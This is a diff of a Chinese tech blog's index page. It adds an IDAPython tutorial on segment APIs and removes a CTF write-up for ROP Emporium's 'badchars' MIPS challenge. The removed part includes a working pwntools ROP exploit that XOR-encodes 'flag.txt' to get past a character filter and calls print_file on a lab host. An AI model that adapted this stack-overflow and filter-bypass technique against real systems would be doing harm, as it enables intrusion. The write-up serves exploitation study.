@@ -605,6 +605,119 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E6%AE%B5%E7%B2%92%E5%BA%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="stay hungry, stay foolish">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/IDAPython-%E6%AE%B5%E7%B2%92%E5%BA%A6/" class="post-title-link" itemprop="url">IDAPython-段粒度</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-06 01:19:48 / Modified: 18:31:03" itemprop="dateCreated datePublished" datetime="2023-04-06T01:19:48+08:00">2023-04-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>简单说明了IDA的反汇编输出窗口内容、如何使用IDAPython对单条指令进行简单分析。后续的笔记将先分别从段（segment）、函数（function）、块（block）、指令（instruction）多个粒度，对IDAPython经常使用到的数据结构和函数API进行说明，然后再到分析必不可少的交叉引用（cross-references）和数据搜索（searching for code or data）。</p>
+<h2 id="segment的基本操作"><a href="#segment的基本操作" class="headerlink" title="segment的基本操作"></a>segment的基本操作</h2><p>如下是对段（segments）进行一些基本的操作。<code>idautils.Segments()</code>会返回一个迭代器，可以使用循环遍历当前文件的所有段对象。对于每一个段对象可以使用<code>idc.get_segm_name</code>获取段名、<code>idc.get_segm_start</code>获取段起始地址、<code>idc.get_segm_end</code>获取段的结束地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    <span class="built_in">print</span>(idc.get_segm_name(seg), idc.get_segm_start(seg), idc.get_segm_end(seg))</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">LOAD 4194304 4194568</span></span><br><span class="line"><span class="string">REGINFO 4194568 4194592</span></span><br><span class="line"><span class="string">LOAD 4194592 4216248</span></span><br><span class="line"><span class="string">.init 4216248 4216384</span></span><br><span class="line"><span class="string">.text 4216384 4649072</span></span><br><span class="line"><span class="string">.MIPS.stubs 4649072 4651008</span></span><br><span class="line"><span class="string">.fini 4651008 4651096</span></span><br><span class="line"><span class="string">LOAD 4651096 4651104</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在实际的代码中，有时候需要对当前地址<code>ea</code>所在的段进行分析。<code>idc.get_segm_start(ea)</code>和<code>idc.get_segm_end(ea)</code>分别可以获取到地址<code>ea</code>所在的段的起始地址和结束地址；<code>idc.get_next_seg(ea)</code>可以获取到<code>ea</code>所在段的下一个段起始地址，然后没有找到对应的寻找上一个段起始地址的API。使用<code>idc.get_segm_name(ea)</code>则可以获取到当前地址<code>ea</code>所在段的段名。如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;idc.get_segm_start(ea)</span><br><span class="line"><span class="number">0x400120</span></span><br><span class="line">Python&gt;idc.get_segm_end(ea)</span><br><span class="line"><span class="number">0x46f8f8</span></span><br><span class="line">Python&gt;idc.get_next_seg(ea)</span><br><span class="line"><span class="number">0x46f8f8</span></span><br><span class="line">Python&gt;idc.get_segm_name(ea)</span><br><span class="line"><span class="string">&#x27;.text&#x27;</span></span><br><span class="line">Python&gt;idc.get_segm_name(<span class="number">0x46f8f8</span>)</span><br><span class="line"><span class="string">&#x27;.fini&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>同样的，也可以根据段名来获取到段相关属性：<code>idc.get_segm_by_sel(idc.selector_by_name(str_SectionName))</code>。需要首先使用<code>idc.selector_by_name(str_SectionName)</code>获取到段名为<code>str_SectionName</code>的段选择器（selector），然后使用<code>idc.get_segm_by_sel()</code>来获取到段的起始地址。如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;str_SectionName = <span class="string">&quot;.text&quot;</span></span><br><span class="line">Python&gt;idc.get_segm_by_sel(idc.selector_by_name(str_SectionName))</span><br><span class="line"><span class="number">0x400120</span></span><br></pre></td></tr></table></figure>
+<h2 id="idc模块中常用的段操作函数"><a href="#idc模块中常用的段操作函数" class="headerlink" title="idc模块中常用的段操作函数"></a>idc模块中常用的段操作函数</h2><table>
+<thead>
+<tr>
+<th>api</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>get_segm_attr(segea, attr)</td>
+<td>根据段中的地址segea获取段的attr属性</td>
+</tr>
+<tr>
+<td>get_segm_start(ea)</td>
+<td>获取段起始地址</td>
+</tr>
+<tr>
+<td>get_segm_end(ea)</td>
+<td>获取段结束地址</td>
+</tr>
+<tr>
+<td>get_segm_name(ea)</td>
+<td>获取段名</td>
+</tr>
+</tbody></table>
+<h2 id="包含更多段操作的模块：ida-segment"><a href="#包含更多段操作的模块：ida-segment" class="headerlink" title="包含更多段操作的模块：ida_segment"></a>包含更多段操作的模块：ida_segment</h2><p><code>idc</code>模块中对段的操作实际上是对<code>ida_segment</code>模块中函数的封装，在<code>ida_segment</code>模块中还有更多段的数据结构和方法，例如：</p>
+<ul>
+<li>新增段：<code>add_segm</code></li>
+<li>删除段：<code>del_segm</code></li>
+<li>根据段名获取段：<code>get_segm_by_name</code></li>
+<li>根据当前地址获取段名：<code>get_segm_name</code></li>
+<li>设置段名：<code>set_segm_name</code></li>
+<li>设置段的起始地址：<code>set_segm_start</code>、<code>set_segm_end</code></li>
+<li>……</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/support/idapython_docs/idc.html">idc API documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/support/idapython_docs/ida_segment.html">ida_segment API documentation</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/idapython-%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1153,102 +1266,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/badchars_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="stay hungry, stay foolish">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/badchars_mipsel/" class="post-title-link" itemprop="url">badchars_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-15 10:13:27" itemprop="dateCreated datePublished" datetime="2023-03-15T10:13:27+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:07:16" itemprop="dateModified" datetime="2023-04-03T13:07:16+08:00">2023-04-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwnme反编译代码如下，可以看到会对写入的缓冲区逐个字节进行检查，如果包含x、g、a、.字符，则替换成0xEB。<br>在程序中含有print_file函数，因此大概的思路是需要使用ROP带参数flag.txt调用print_file函数，同时需要找一个方法来规避pwnme函数对缓冲区中数字的过滤。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">32</span>]; <span class="comment">// [sp+28h] [+28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;MIPS\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  len = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )  <span class="comment">// 对写入缓冲区中的数据进行检查，如果有badchar，则替换</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">0xEB</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>通过看官方内置的gadgets，大概的思路应该是，先将ROP异或某个数写入到缓冲区，然后控制流劫持后，再使用异或恢复缓冲区。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               usefulGadgets:</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400944</span><br><span class="line">.text:00400948 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:0040094C 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400950 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:00400954 00 00 2A 8D                   lw      $t2, 0($t1)</span><br><span class="line">.text:00400958 26 40 0A 01                   xor     $t0, $t2</span><br><span class="line">.text:0040095C 00 00 28 AD                   sw      $t0, 0($t1)</span><br><span class="line">.text:00400960 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400964 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400964</span><br><span class="line">.text:00400968 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:0040096C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400970 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400974 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class="line">.text:00400974</span><br><span class="line">.text:00400978 00 00 00 00                   nop</span><br><span class="line">.text:0040097C 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>
-<p>可以将该gadget分成三段：<br>第一段：write_to_addr，负责写入4个字节到data段中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               write_to_addr</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)  # 下个gadget地址</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)    # 写入目标地址</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)    # 写入的数据</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br></pre></td></tr></table></figure>
-<p>第二段：xor_decrypt，负责对指定地址的4个字节进行xor解密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00400948                               xor_decrypt</span><br><span class="line">.text:00400948 0C 00 B9 8F                   lw      $t9, 0xC($sp)  # 下个gadget地址</span><br><span class="line">.text:0040094C 08 00 A8 8F                   lw      $t0, 8($sp)    # xor解密key</span><br><span class="line">.text:00400950 04 00 A9 8F                   lw      $t1, 4($sp)    # 数据地址</span><br><span class="line">.text:00400954 00 00 2A 8D                   lw      $t2, 0($t1)</span><br><span class="line">.text:00400958 26 40 0A 01                   xor     $t0, $t2</span><br><span class="line">.text:0040095C 00 00 28 AD                   sw      $t0, 0($t1)</span><br><span class="line">.text:00400960 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400964 10 00 BD 23                   addi    $sp, 0x10</span><br></pre></td></tr></table></figure>
-<p>第三段：print_file，带参数调用print_file函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00400968 08 00 A4 8F                   lw      $a0, 8($sp)  # flag.txt地址</span><br><span class="line">.text:0040096C 04 00 B9 8F                   lw      $t9, 4($sp)  # print_file函数 </span><br><span class="line">.text:00400970 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400974 0C 00 BD 23                   addi    $sp, 0xC</span><br></pre></td></tr></table></figure>
-<p>ROP构造如下：<br>先填充到返回地址，ra保存在SP+0x4C，缓冲区位于SP+0x28，因此需要填充0x24，才能覆盖返回地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br></pre></td></tr></table></figure>
-<p>badchars &#x3D;  ‘.’, ‘a’, ‘g’, ‘x’ &#x3D; 0x2e, 0x61, 0x67, 0x78，可以采用如下的脚本去选择一个key来和字符串进行异或：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">badchars = <span class="string">b&quot;.agx&quot;</span></span><br><span class="line">flag_txt = <span class="string">b&quot;flag.txt&quot;</span></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag_txt:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> each ^ i <span class="keyword">not</span> <span class="keyword">in</span> badchars:</span><br><span class="line">            key += <span class="built_in">str</span>(<span class="built_in">hex</span>(i)) + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(each), <span class="built_in">hex</span>(i ^ each), <span class="built_in">chr</span>(i ^ each))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>, key)</span><br></pre></td></tr></table></figure>
-<p>继续构造ROP，将xor_flag分两次通过第一个gadget写入到data段上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rop += p32(write_to_addr)</span><br><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x66\x6c\x60\x66&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += p32(write_to_addr)</span><br><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x2f\x74\x79\x74&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += p32(xor_decrypt)</span><br></pre></td></tr></table></figure>
-<p>此时就规避了程序对于关键字符的过滤，那么在执行ROP的时候还需要对该字符串进行解密</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x00\x00\x01\x01&quot;</span></span><br><span class="line">rop += p32(xor_decrypt)</span><br><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x01\x00\x01\x00&quot;</span></span><br><span class="line">rop += p32(print_file)</span><br></pre></td></tr></table></figure>
-<p>解密完成后，调用print_file函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./badchars_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">write_to_addr = <span class="number">0x00400930</span></span><br><span class="line">xor_decrypt = <span class="number">0x00400948</span></span><br><span class="line">print_file = <span class="number">0x00400968</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line"></span><br><span class="line">rop += p32(write_to_addr)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x66\x6c\x60\x66&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += p32(write_to_addr)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x2f\x74\x79\x74&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += p32(xor_decrypt)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x00\x00\x01\x01&quot;</span></span><br><span class="line">rop += p32(xor_decrypt)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x01\x00\x01\x00&quot;</span></span><br><span class="line">rop += p32(print_file)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./raw&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(rop)</span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>结果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 badchars.py</span></span><br><span class="line">[*] &#x27;/home/utest/Code/mipsrop/badchars_mipsel/badchars_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1318,7 +1335,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
